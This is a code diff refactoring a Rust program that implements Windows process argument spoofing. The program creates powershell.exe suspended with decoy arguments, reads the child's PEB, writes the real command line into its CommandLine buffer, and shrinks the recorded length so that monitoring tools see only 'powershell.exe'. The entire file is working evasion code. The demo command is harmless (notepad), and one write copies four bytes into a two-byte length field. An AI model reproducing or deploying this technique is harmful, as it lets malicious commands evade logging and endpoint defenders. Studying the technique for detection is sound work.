@@ -1,14 +1,19 @@
 use std::{ffi::c_void, mem::size_of};
-use windows::core::{w, PWSTR};
-use windows::Win32::Foundation::{CloseHandle, HANDLE, UNICODE_STRING};
-use windows::Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation};
-use windows::Win32::System::{
-    Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
-    Threading::{
-        CreateProcessW, ResumeThread, WaitForSingleObject, CREATE_NO_WINDOW, CREATE_SUSPENDED,
-        INFINITE, PEB, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, RTL_USER_PROCESS_PARAMETERS,
-        STARTUPINFOW,
-    },
+use windows::{
+    core::{w, PWSTR},
+    Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation},
+    Win32::{
+        Foundation::{CloseHandle, UNICODE_STRING}, 
+        System::{
+            Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
+            Threading::{
+                CreateProcessW, ResumeThread, WaitForSingleObject, 
+                CREATE_NO_WINDOW, CREATE_SUSPENDED, INFINITE, PEB, 
+                PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, 
+                RTL_USER_PROCESS_PARAMETERS, STARTUPINFOW,
+            },
+        }
+    }
 };
 
 macro_rules! offset_of {
@@ -19,20 +24,17 @@ macro_rules! offset_of {
     }};
 }
 
-fn main() {
-    let mut startup_info = STARTUPINFOW::default();
-    let mut pi = PROCESS_INFORMATION::default();
-    let mut pbi = PROCESS_BASIC_INFORMATION::default();
-    let mut ppeb = PEB::default();
-    let mut p_params = RTL_USER_PROCESS_PARAMETERS::default();
-    let mut return_len: u32 = 0;
-
+fn main() -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
         // Creating a process in suspended mode
-        let mut start_argument: Vec<u16> = "powershell.exe args spoofing\0".encode_utf16().collect(); // Command that will perform spoofing
-        startup_info.cb = size_of::<STARTUPINFOW>() as u32;
+        let mut start_argument = to_pwstr("powershell.exe args spoofing"); // Command that will perform spoofing
+        let mut process_information = PROCESS_INFORMATION::default();
+        let mut startup_info = STARTUPINFOW {
+            cb: size_of::<STARTUPINFOW>() as u32,
+            ..Default::default()
+        };
 
-        let _process = CreateProcessW(
+        CreateProcessW(
             None,
             PWSTR(start_argument.as_mut_ptr()),
             None,
@@ -42,97 +44,84 @@ fn main() {
             None,
             w!("C:\\Windows\\System32\\"),
             &mut startup_info,
-            &mut pi,
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateProcessW Failed With Error: {e}");
-        });
+            &mut process_information,
+        )?;
 
         println!("[+] DONE!");
-        println!("[+] Target PID Process: {}", pi.dwProcessId);
+        println!("[+] Target PID Process: {}", process_information.dwProcessId);
 
-        let hprocess = pi.hProcess;
-        let hthread = pi.hThread;
+        let h_process = process_information.hProcess;
+        let h_thread = process_information.hThread;
 
         // Retrieving PEB address
+        let mut process_basic = PROCESS_BASIC_INFORMATION::default();
+        let mut return_len: u32 = 0;
         NtQueryInformationProcess(
-            hprocess,
+            h_process,
             ProcessBasicInformation,
-            &mut pbi as *mut _ as *mut c_void,
+            &mut process_basic as *mut _ as *mut c_void,
             size_of::<PROCESS_BASIC_INFORMATION>() as u32,
             &mut return_len,
         );
 
-        println!("[+] Adress to PEB: {:?}", pbi.PebBaseAddress);
+        println!("[+] Adress to PEB: {:?}", process_basic.PebBaseAddress);
 
         // Reading the PEB address
+        let mut peb = PEB::default();
         ReadProcessMemory(
-            hprocess,
-            pbi.PebBaseAddress as *const c_void,
-            &mut ppeb as *mut _ as *mut c_void,
+            h_process,
+            process_basic.PebBaseAddress as *const c_void,
+            &mut peb as *mut _ as *mut c_void,
             size_of::<PEB>(),
             None,
-        ).unwrap_or_else(|e| {
-            clear(hprocess, hthread);
-            panic!("[!] ReadProcessMemory (1) Failed With Error: {e}");
-        });
+        )?;
 
         // Reading the RTL_USER_PROCESS_PARAMETERS structure from the remote process's PEB
+        let mut user_process_params = RTL_USER_PROCESS_PARAMETERS::default();
         ReadProcessMemory(
-            hprocess,
-            ppeb.ProcessParameters as *const c_void,
-            &mut p_params as *mut _ as *mut c_void,
+            h_process,
+            peb.ProcessParameters as *const c_void,
+            &mut user_process_params as *mut _ as *mut c_void,
             size_of::<RTL_USER_PROCESS_PARAMETERS>() + 255,
             None,
-        ).unwrap_or_else(|e| {
-            clear(hprocess, hthread);
-            panic!("[!] ReadProcessMemory (2) Failed With Error: {e}");
-        });
+        )?;
 
         // Changing the Buffer value for the actual command
-        let reajust_argument: Vec<u16> = "powershell.exe -NoExit notepad.exe\0"
-            .encode_utf16()
-            .collect();
-
+        let reajust_argument = to_pwstr("powershell.exe -NoExit notepad.exe");
         WriteProcessMemory(
-            hprocess,
-            p_params.CommandLine.Buffer.as_ptr() as _,
+            h_process,
+            user_process_params.CommandLine.Buffer.as_ptr() as _,
             reajust_argument.as_ptr() as _,
             reajust_argument.len() * size_of::<u16>() + 1,
             None,
-        ).unwrap_or_else(|e| {
-            clear(hprocess, hthread);
-            panic!("[!] WriteProcessMemory (1) Failed With Error: {e}");
-        });
+        )?;
 
         // Changing the size of CommandLine.Length
-        let new_len_power: usize = "powershell.exe\0".encode_utf16().count() * size_of::<u16>();
-        let offset = ppeb.ProcessParameters as usize + offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offset_of!(UNICODE_STRING, Length);
+        let new_len_power = "powershell.exe".encode_utf16().chain(Some(0)).count() * size_of::<u16>();
+        let offset = peb.ProcessParameters as usize + offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offset_of!(UNICODE_STRING, Length);
         
         WriteProcessMemory(
-            hprocess,
-            offset as _,
+            h_process,
+            offset as *const c_void,
             &new_len_power as *const _ as *const c_void,
             size_of::<u32>(),
             None,
-        ).unwrap_or_else(|e| {
-            clear(hprocess, hthread);
-            panic!("[!] WriteProcessMemory (2) Failed With Error: {e}");
-        });
+        )?;
 
         println!("[+] Thread Executed!!");
 
         // Resuming the Thread for execution
-        ResumeThread(hthread);
-        WaitForSingleObject(hthread, INFINITE);
+        ResumeThread(h_thread);
+        WaitForSingleObject(h_thread, INFINITE);
 
-        clear(hprocess, hthread)
+        CloseHandle(h_process)?;
+        CloseHandle(h_thread)?;
     }
+
+    Ok(())
 }
 
-#[allow(unused_must_use)]
-fn clear(hprocess: HANDLE, hthread: HANDLE) {
-    unsafe {
-        CloseHandle(hprocess);
-        CloseHandle(hthread);
-    };
+/// Converts a Rust string `&str` to a UTF-16 null pointer (PWSTR).
+fn to_pwstr(s: &str) -> Vec<u16> {
+    s.encode_utf16().chain(Some(0)).collect()
 }
